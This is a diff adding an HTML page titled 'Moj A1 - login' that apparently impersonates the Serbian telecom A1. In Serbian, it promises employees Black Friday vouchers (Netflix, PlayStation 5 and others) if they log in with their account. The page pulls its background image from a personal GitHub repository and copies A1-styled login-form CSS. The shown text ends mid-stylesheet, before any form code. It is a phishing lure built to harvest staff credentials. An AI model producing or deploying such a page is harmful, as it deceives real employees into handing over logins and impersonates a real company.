@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        img, p {
+            
+            font-family: Calibri, Arial, Helvetica, sans-serif;
+            font-size: 11pt;
+            font-weight: bold;
+            color: black;
+            margin: 10px 0;
+        }
+    </style>
+    <title>Moj A1 - login</title>
+</head>
+<body>
+    
+    <img src="data:image/jpeg;base64,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">
+    <p>A1 Srbija ove godine organizuje specijalne ponude za zaposlene u saradnji sa Gigatron-om i Tehnomanijom.<br>
+        <br><p>Black Friday giveaway deli vredne nagrade i popuste za zaposlene.&nbsp;</p><br>
+        <p>Vauceri za Netflix, Deezer, Arena Cloud, Sony Playstation 5, A1 zabava kodovi vauceri - specijalna ponuda za Black Friday vazi do kraja dana.&nbsp;</p><br>
+        <p>Kako biste obezbedili vas vaucer za Black Friday popuste ulogujte se sa vasim nalogom i pogledajte specijalnu ponudu za zaposlene u A1.&nbsp;</p><br>
+    </p>
+
+  
+    <style>
+        body { 
+        	background-image: url('https://raw.githubusercontent.com/vojislav1977/A1/main/bf.jfif');
+            background-repeat: no-repeat;
+            background-position: center;
+             }
+        
+        .header-bar .container, .popup-bottom-msg .container, .content-wrapper .container {
+  width: 100%;
+  overflow-x: hidden;
+  background: transparent; }
+
+.header-bar .container, .popup-bottom-msg .container {
+  padding: 0 25px; }
+  @media all and (min-width: 834px) {
+    .header-bar .container, .popup-bottom-msg .container {
+      padding: 0 30px; } }
+  @media all and (min-width: 1024px) {
+    .header-bar .container, .popup-bottom-msg .container {
+      padding: 0 56px; } }
+  @media all and (min-width: 1200px) { 
+    .header-bar .container, .popup-bottom-msg .container {
+      padding: 0 95px; } }
+
+.header-bar {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  background-color: transparent; }
+  .header-bar__content {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 0; }
+    .header-bar__content img.a1-logo {
+      width: 51px;
+      height: 51px; }
+      @media all and (min-width: 834px) {
+        .header-bar__content img.a1-logo {
+          width: 51px;
+          height: 51px; } }
+    .header-bar__content a {
+      font-family: "A1Serif-Regular";
+      font-size: 16px;
+      color: #000; }
+
+button.a1-btn {
+  appearance: none;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 15px;
+  font-family: "A1Serif-Bold";
+  font-size: 14px;
+  color: #fff;
+  background-color: #DA291C;
+  border: none;
+  cursor: pointer;
+  outline: none; }
+  button.a1-btn .icon {
+    position: relative;
+    transition: transform 0.3s ease; }
+  button.a1-btn:hover .icon {
+    transform: translate(50%); }
+
+.custom-input {
+  display: block; }
+  .custom-input .value-box {
+    position: relative;
+    display: flex;
+    height: 55px;
+    background-color: #fcfcfc; }
+    .custom-input .value-box .placeholder {
+      position: absolute;
+      top: 10px;
+      transform: translateY(-50%);
+      left: 15px;
+      font-family: "A1Sans-Regular";
+      font-size: 14px;
+      color: #585858;
+      transition: all 0.3s; }
+    .custom-input .value-box input {
+      -webkit-appearance: none;
+      appearance: none;
+      border: none;
+      outline: none;
+      background-color: transparent;
+      font-family: "A1Sans-Bold";
+      font-size: 16px;
+      flex: 1;
+      height: 100%;
+      border-bottom: 1px solid #bbbbbb;
+      padding-left: 15px;
+      padding-top: 15px; }
+      .custom-input .value-box input:-webkit-autofill, .custom-input .value-box input:-webkit-autofill:hover, .custom-input .value-box input:-webkit-autofill:focus, .custom-input .value-box input:-webkit-autofill:active {
+        transition: background-color 5000s ease-in-out 0s; }
+    .custom-input .value-box.active .placeholder {
+      top: 10px;
+      font-size: 14px; }
+  .custom-input.with-btn .value-box input {
+    border-bottom: none; }
+  .custom-input.with-btn .value-box button {
+    height: 100%;
+    width: 122px;
+    justify-content: center; }
+  .custom-input .error-msg {
+    display: none;
+    color: #DA291C;
+    font-family: "A1Sans-Regular";
+    font-size: 12px;
+    margin-top: 6px;
+    padding-left: 15px; }
+  .custom-input.error .value-box .placeholder {
+    color: #DA291C; }
+  .custom-input.error .value-box input {
+    border-bottom: 1px solid #DA291C; }
+  .custom-input.error .error-msg {
+    display: block; }
+  .custom-input.disabled .value-box {
+    background-color: #efefef; }
+    .custom-input.disabled .value-box input {
+      color: #808080; }
+      .custom-input.disabled .value-box input:-webkit-autofill, .custom-input.disabled .value-box input:-webkit-autofill:hover, .custom-input.disabled .value-box input:-webkit-autofill:focus, .custom-input.disabled .value-box input:-webkit-autofill:active {
+        -webkit-text-fill-color: #808080; }
+
+.custom-input-checkbox {
+  position: relative;
+  height: 26px;
+  display: flex;
+  align-items: center; }
+  .custom-input-checkbox__label {
+    margin-left: 45px;
+    font-family: "A1Sans-Regular";
+    font-size: 14px; }
+  .custom-input-checkbox input[type="checkbox"] {
+    -webkit-appearance: none;
+    appearance: none;
+    border: none;
+    outline: none;
+    background-color: transparent; }
+    .custom-input-checkbox input[type="checkbox"] ~ .custom-input-checkbox__graphic {
+      position: absolute;
+      top: 0;
+      bottom: 0;
+      margin: auto 0;
+      left: 0;
+      background-color: transparent;
+      border: 1px solid rgba(0, 0, 0, 0.1);
+      width: 25px;
+      height: 25px; }
+      .custom-input-checkbox input[type="checkbox"] ~ .custom-input-checkbox__graphic::after {
+        content: "";
+        position: absolute;
+        opacity: 0;
+        top: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        margin: auto;
+        background-color: #DA291C; }
+    .custom-input-checkbox input[type="checkbox"]:checked ~ .custom-input-checkbox__graphic {
+      background-color: #DA291C;
+      transition: background-color 0.3s; }
+      .custom-input-checkbox input[type="checkbox"]:checked ~ .custom-input-checkbox__graphic::after {
+        width: 14px;
+        height: 12px;
+        background-image: url("../img/check-sign-checked.svg");
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+        opacity: 1;
+        transition: opacity 0.3s; }
+
+* {
+  box-sizing: border-box;
+  font-weight: normal;
+  -webkit-tap-highlight-color: transparent; }
+  *:focus {
+    outline: none; }
+
+a {
+  text-decoration: none;
+  color: #DA291C;
+  display: inline-block; }
+
+body {
+    margin-left: 3cm;
+  /* margin: 0; */
+  padding: 0;
+  scrollbar-color: #d7d7d7 rgba(0, 0, 0, 0);
+  scrollbar-width: thin; }
+  body h1,
+  body h2,
+  body h3,
+  body h4,
+  body h5,
+  body h6,
+  body p {
+    margin: 0;
+    line-height: 1; }
+  body h1 {
+    font-family: "A1Serif-Bold";
+    font-size: 36px;
+    line-height: 1.25; }
+    @media all and (min-width: 834px) {
+      body h1 {
+        font-size: 48px; } }
+  body p {
+    
+    font-family: "A1Sans-Regular";
+    font-size: 14px;
+    line-height: 1; }
+  body img {
+    
+    display: block;
+    max-width: 100%; }
+  body::-webkit-scrollbar {
+    background: #fff;
+    width: 5px; }
+  body::-webkit-scrollbar-thumb {
+    background-color: #d7d7d7;
+    border-radius: 35px;
+    width: 5px; }
+
+.content-wrapper {
+  width: 100%; }
+    @media all and (min-width: 834px) {
+      .content-wrapper .container {
+        padding-left: 92px; } }
+    @media all and (min-width: 1024px) {
+      .content-wrapper .container {
+        padding-left: 140px; } }
+    @media all and (min-width: 1200px) {
+      .content-wrapper .container {
+        padding-left: 200px; } }
+
+.content {
+  width: 100%;
+  padding-top: 108px; }
+  @media all and (min-width: 834px) {
+    .content {
+      width: 376px; } }
+
+.asmp-form {
+  margin-top: 40px; }
+  @media all and (min-width: 834px) {
+    .asmp-form {
+      margin-top: 50px;
+      margin-bottom: 70px; } }
+  .asmp-form .custom-input {
+    margin-bottom: 24px; }
+    .asmp-form .custom-input:last-child {
+      margin-bottom: 0; }
+  .asmp-form label.custom-input {
+    margin-bottom: 20px; }
+    .asmp-form label.custom-input.last {
+      margin-bottom: 40px; }
+  .asmp-form label.custom-input-checkbox {
+    margin-bottom: 20px; }
+    .asmp-form label.custom-input-checkbox.last {
+      margin-bottom: 40px; }
+  .asmp-form .recaptcha {
+    margin-bottom: 50px; }
+  .asmp-form .submit-section {
+    display: block; }
+    @media all and (min-width: 834px) {
+      .asmp-form .submit-section {
+        display: flex;
+        justify-content: space-between;
+        align-items: center; } }
+    .asmp-form .submit-section .a1-btn {
+      width: 139px;
+      margin-bottom: 30px; }
+      @media all and (min-width: 834px) {
+        .asmp-form .submit-section .a1-btn {
+          margin-bottom: 0; } }
+    .asmp-form .submit-section p {
+      word-wrap: none;
+      font-size: 12px; }
+  .asmp-form a {
+    text-decoration: underline; }
+  .asmp-form a.forgot-pass {
+    margin-top: 30px;
+    margin-bottom: 20px;
+    font-size: 12px; }
+  .asmp-form button.a1-btn {
+    height: 40px;
+    width: 139px; }
+
+.popup-bottom-msg {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: transparent;
+  visibility: hidden;
+  opacity: 0;
+  transition: opacity .3s, visibility .3s; }
+  .popup-bottom-msg.show {
+    visibility: visible;
+    opacity: 1; }
+  @media all and (min-width: 834px) {
+    .popup-bottom-msg {
+      bottom: 20px; } }
+  @media all and (max-width: 833px) {
+    .popup-bottom-msg .container {
+      padding: 0; } }
+  .popup-bottom-msg__content {
